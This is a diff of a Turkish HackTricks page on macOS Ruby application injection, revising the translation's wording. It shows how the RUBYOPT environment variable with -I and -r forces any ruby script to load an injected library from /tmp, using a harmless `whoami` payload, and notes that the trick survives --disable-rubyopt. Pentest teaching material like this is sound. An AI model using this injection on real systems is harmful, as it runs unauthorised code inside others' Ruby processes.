@@ -1,24 +1,24 @@
-# macOS Ruby Uygulamaları Enjeksiyonu
+# macOS Ruby Applications Injection
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 ## RUBYOPT
 
-Bu ortam değişkenini kullanarak **ruby** her çalıştırıldığında **yeni parametreler eklemek** mümkündür. Ancak **`-e`** parametresi çalıştırılacak ruby kodunu belirtmek için kullanılamaz, bununla birlikte **`-I`** ve **`-r`** parametrelerini kullanarak yükleme yolu için yeni bir klasör eklemek ve ardından **yüklemek için bir kütüphane belirtmek** mümkündür.
+Bu env variable kullanılarak, **ruby** her çalıştırıldığında **yeni parametreler eklemek** mümkündür. Ruby kodunu çalıştırmak için **`-e`** parametresi kullanılamasa da, kütüphanelerin yükleme yoluna yeni bir klasör eklemek ve ardından **yüklenecek bir kütüphane belirtmek** için **`-I`** ve **`-r`** parametrelerini kullanmak mümkündür.
 
-**`/tmp`** dizininde **`inject.rb`** kütüphanesini oluşturun:
+**`inject.rb`** kütüphanesini **`/tmp`** içinde oluşturun:
 ```ruby:inject.rb
 puts `whoami`
 ```
-Herhangi bir yerde aşağıdaki gibi bir ruby betiği oluşturun:
+Herhangi bir yerde şu tür bir ruby script oluşturun:
 ```ruby:hello.rb
 puts 'Hello, World!'
 ```
-Arbitrary bir ruby betiği ile yükleyin:
+Ardından, rastgele bir Ruby script'e bunu yükletin:
 ```bash
 RUBYOPT="-I/tmp -rinject" ruby hello.rb
 ```
-Eğlenceli bir gerçek, **`--disable-rubyopt`** parametresi ile bile çalışıyor:
+İlginç bir bilgi: **`--disable-rubyopt`** parametresiyle bile çalışır:
 ```bash
 RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
 ```
